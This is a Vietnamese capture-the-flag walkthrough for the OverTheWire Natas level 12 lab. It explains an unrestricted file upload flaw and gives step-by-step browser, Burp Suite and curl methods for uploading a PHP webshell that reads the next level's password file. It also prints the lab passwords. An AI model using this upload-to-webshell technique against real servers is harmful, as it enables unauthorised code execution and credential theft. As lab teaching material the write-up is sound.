# Level 12 -> Level 13

Choose a JPEG to upload (max 1KB):
[Chọn tệp] [Upload File]

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 11)

- **URL**: `http://natas12.natas.labs.overthewire.org`
- **Username**: `natas12`
- **Password**: `EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 12

### Thử thách
Trang web cung cấp một tính năng tải tệp ảnh lên máy chủ (Upload File) với thông báo: *"Choose a JPEG to upload (max 1KB)"*.
Sau khi tải lên thành công, hệ thống sẽ cấp một đường dẫn để người dùng xem lại tệp đã tải tại thư mục `upload/<tên_ngẫu_nhiên>.<đuôi_mở_rộng>`.

Bên dưới biểu mẫu có liên kết **`View sourcecode`**.

### Phân tích mã nguồn PHP (`index-source.html`)
Mở mã nguồn trang web, ta quan sát các hàm xử lý tệp tin tải lên:

```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
}
```

Và cấu trúc biểu mẫu HTML:
```html
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```

### Manh mối & Kiến thức cốt lõi: Lỗ hổng tải lên tệp tin không an toàn (Unrestricted File Upload)

1. **Sai lầm trong việc xác định phần mở rộng (File Extension)**:
   - Thay vì lấy phần mở rộng từ chính tệp tin được tải lên (`$_FILES['uploadedfile']['name']`), mã nguồn lại lấy từ tham số POST:
     ```php
     $ext = pathinfo($_POST["filename"], PATHINFO_EXTENSION);
     ```
   - Tham số này được tạo sẵn trong biểu mẫu dưới dạng một thẻ ẩn (hidden input):
     ```html
     <input type="hidden" name="filename" value="xxxxxx.jpg" />
     ```
   - Vì thẻ này nằm ở phía máy khách (Client-Side), người dùng có toàn quyền can thiệp và sửa đổi giá trị `.jpg` thành **`.php`** trước khi gửi gói tin lên máy chủ.

2. **Thiếu cơ chế kiểm tra nội dung tệp (File Validation)**:
   - Máy chủ chỉ kiểm tra kích thước tệp (`filesize > 1000 byte`) mà hoàn toàn **không kiểm tra định dạng thực tế của tệp** (không kiểm tra MIME type hay Magic Bytes nhận diện ảnh).
   - Thư mục lưu trữ `/upload/` lại được cấp quyền thực thi mã kịch bản (Script Execution).

3. **Khai thác Thực thi mã từ xa (Remote Code Execution - RCE) qua Webshell**:
   - Nếu ta tải lên một tệp chứa mã PHP và ép máy chủ lưu tệp đó với đuôi mở rộng `.php`, máy chủ Apache sẽ thực thi đoạn mã PHP này ngay khi ta truy cập vào đường dẫn tệp.
   - Đoạn mã PHP độc hại (Webshell) dùng để đọc mật khẩu của `natas13`:
     ```php
     <?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
     ```

---

## 3. CÔNG CỤ CẦN DÙNG

- **Trình soạn thảo văn bản (Notepad)**: Tạo tệp mã PHP nhỏ.
- **Trình duyệt Web (DevTools F12)**: Sửa trực tiếp thuộc tính `value` của thẻ ẩn `input` trên trang web.
- **Burp Suite**: Bắt gói tin tải lên và đổi giá trị tham số `filename`.
- **Dòng lệnh CLI (cURL)**: Gửi request POST multipart từ terminal.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 13

### Bước chuẩn bị: Tệp mã PHP (Webshell)
Sử dụng tệp tin [src/shell12.php](src/shell12.php) trong thư mục `src/`, bên trong chứa nội dung sau:

```php
<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
```

---

### Cách 1: Thao tác trực tiếp trên Trình duyệt bằng F12 (Nhanh nhất)

- **Bước 1**: Mở trình duyệt và truy cập đường dẫn:
  ```text
  http://natas12.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas12`
  - **Pass**: `EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`

- **Bước 2**: Bấm phím **`F12`** (hoặc click chuột phải chọn **Inspect** / Kiểm tra) $\rightarrow$ chọn tab **Elements**.

- **Bước 3**: Tìm đến dòng thẻ `input` ẩn trong mã HTML:
  ```html
  <input type="hidden" name="filename" value="xxxxxx.jpg">
  ```
  Click đúp chuột vào giá trị `xxxxxx.jpg` và sửa đuôi mở rộng thành `.php` (ví dụ đổi thành `shell12.php`):
  ```html
  <input type="hidden" name="filename" value="shell12.php">
  ```

- **Bước 4**: Quay lại giao diện trang web:
  - Bấm nút **Chọn tệp (Choose File)** $\rightarrow$ chọn tệp `shell12.php` trong thư mục `src/`.
  - Bấm nút **Upload File**.

- **Bước 5**: Trang web hiển thị thông báo tải lên thành công kèm liên kết dạng:
  ```text
  The file upload/xxxxxx.php has been uploaded
  ```

- **Bước 6**: Nhấp chuột vào liên kết `upload/xxxxxx.php` vừa hiện ra. Máy chủ sẽ thực thi đoạn mã PHP và in trực tiếp mật khẩu của `natas13` lên màn hình!

---

### Cách 2: Sử dụng Burp Suite

- **Bước 1**: Mở trình duyệt của Burp Suite (`Open browser`) và truy cập đường dẫn:
  ```text
  http://natas12.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas12`
  - **Pass**: `EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`

- **Bước 2**: Trên trang web, chọn tệp `shell12.php` (trong thư mục `src/`) cần tải lên.
- **Bước 3**: Chuyển sang Burp Suite, vào tab **`Proxy`** $\rightarrow$ bấm bật **`Intercept is on`**.
- **Bước 4**: Quay lại trình duyệt và bấm nút **Upload File**.
- **Bước 5**: Gói tin gửi tệp bị chặn lại tại tab `Intercept`. Tìm đến khối dữ liệu của tham số `filename`:
  ```http
  Content-Disposition: form-data; name="filename"

  xxxxxx.jpg
  ```
  Sửa giá trị `xxxxxx.jpg` thành:
  ```http
  shell12.php
  ```
- **Bước 6**: Bấm nút màu cam **`Forward`** để gửi gói tin đi.
- **Bước 7**: Trên trình duyệt, bấm vào đường dẫn `upload/xxxxxx.php` để đọc mật khẩu.

---

### Cách 3: Sử dụng dòng lệnh PowerShell / Terminal với cURL

Gửi gói tin tải tệp multipart trực tiếp từ dòng lệnh:

```powershell
curl.exe -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng -F "filename=exploit.php" -F "uploadedfile=<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>;filename=exploit.php" http://natas12.natas.labs.overthewire.org/index.php
```

*Sau khi nhận được thông báo chứa đường dẫn `upload/xxxxxx.php`, truy cập đường dẫn đó để lấy mật khẩu:*
```powershell
curl.exe -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng http://natas12.natas.labs.overthewire.org/upload/xxxxxx.php
```

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 13

```text
Password natas13: [g8ba0olAzaSJuyS4gnmbdVVigAICLG1k]
```
